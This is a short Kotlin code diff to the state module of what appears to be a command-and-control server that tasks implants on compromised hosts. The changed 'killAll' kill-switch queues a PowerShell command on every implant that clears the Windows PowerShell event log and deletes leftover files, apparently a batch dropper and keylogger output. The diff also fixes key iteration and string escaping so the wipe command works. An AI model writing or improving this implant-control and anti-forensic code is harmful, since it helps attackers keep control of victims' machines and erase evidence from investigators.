@@ -170,6 +170,11 @@ object C2State {
         }
     }
 
+    /** UI-only console clear; audit.jsonl on disk keeps its full history. */
+    fun clearAuditUi() {
+        synchronized(lock) { _audit.value = emptyList() }
+    }
+
     fun recordDecision(action: String, target: String, reason: String): Decision {
         val d = Decision(now(), action, target, reason)
         synchronized(lock) {
@@ -212,7 +217,7 @@ object C2State {
     }
 
     fun setTaskAll(task: (String) -> JSONObject) {
-        val hosts = taskq.keys().toSet() + _implants.value.keys
+        val hosts = taskq.keys.toSet() + _implants.value.keys
         for (h in hosts) taskq[h] = task(h)
         publishTasks()
     }
@@ -232,13 +237,13 @@ object C2State {
     // ------------------------------------------------------------------ kill-switch
     /** KillAll parity: set wipe/die task on every known implant; arm the flag. */
     fun killAll(wipeFirst: Boolean = true): List<String> {
-        val hosts = taskq.keys().toSet() + _implants.value.keys
+        val hosts = taskq.keys.toSet() + _implants.value.keys
         for (h in hosts) {
             if (wipeFirst) {
                 taskq[h] = JSONObject().put("act", "run").put(
                     "cmd",
                     "powershell -NoProfile -Command \"wevtutil cl 'Windows PowerShell';" +
-                        " Remove-Item $env:TEMP\\a.bat,$env:TEMP\\kl.klq -ErrorAction SilentlyContinue\""
+                        " Remove-Item ${'$'}env:TEMP\\a.bat,${'$'}env:TEMP\\kl.klq -ErrorAction SilentlyContinue\""
                 )
             } else {
                 taskq[h] = JSONObject().put("act", "none")
